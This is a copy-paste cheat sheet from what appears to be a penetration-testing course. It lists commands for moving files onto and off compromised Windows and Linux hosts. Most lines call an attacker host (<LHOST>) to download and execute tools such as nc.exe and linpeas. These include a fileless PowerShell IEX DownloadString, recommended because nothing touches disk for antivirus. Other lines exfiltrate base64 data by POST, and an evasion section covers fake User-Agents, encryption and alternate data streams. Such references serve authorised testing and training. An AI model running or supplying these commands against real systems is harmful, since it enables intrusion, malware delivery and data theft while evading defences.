# File Transfers Cheat Sheet

Flat copy-paste reference (explanations in `07-file-transfers/README.md`).
Placeholders: `<TARGET_IP>`, `<LHOST>`, `<USER>`, `<PASS>`, `<DOMAIN>`.

## Host a server on the attack box
```bash
python3 -m http.server 80                 # HTTP
impacket-smbserver share . -smb2support    # SMB (add USER PASS for auth)
php -S 0.0.0.0:80                           # PHP
```

## Windows — download / exec / upload
```powershell
Invoke-WebRequest http://<LHOST>/tool.ps1 -OutFile tool.ps1
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/x.ps1')   # fileless, in-memory
Invoke-WebRequest -Uri http://<LHOST>/upload -Method POST -Body $b64     # exfil (base64 first)
certutil.exe -urlcache -split -f http://<LHOST>/nc.exe nc.exe
certutil.exe -verifyctl -split -f http://<LHOST>/nc.exe                   # alternate certutil
bitsadmin /transfer j http://<LHOST>/nc.exe C:\Temp\nc.exe
# evasion: real browser UA
Invoke-WebRequest http://<LHOST>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
```

## Linux — download
```bash
wget http://<LHOST>/linpeas.sh -O /tmp/x.sh
curl http://<LHOST>/x.sh -o /tmp/x.sh
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<LHOST>/f','f')"
php -r 'file_put_contents("f",file_get_contents("http://<LHOST>/f"));'
```

## Protocol-based (both)
```bash
scp <USER>@<TARGET_IP>:/tmp/file .           # download over SSH
scp ./file <USER>@<TARGET_IP>:/tmp/file      # upload over SSH
nc -lvnp 4444 > out ; nc <TARGET_IP> 4444 < file     # netcat
smbclient //<TARGET_IP>/share -U <USER>      # then get/put
tftp -i <TARGET_IP> GET nc.exe
```

## Evasion
Alternate ports · legit User-Agents · `base64`/`certutil -encode` · compress+encrypt (`7z a -p -mhe`) · Windows alternate data streams (`type nc.exe > f.txt:nc.exe`).

> `python3 -m http.server` + `wget`/`certutil`/IWR covers ~90% of transfers. `IEX (...).DownloadString` is the fileless favorite — nothing hits disk for AV. Document every transferred file name + hash + path for the report.
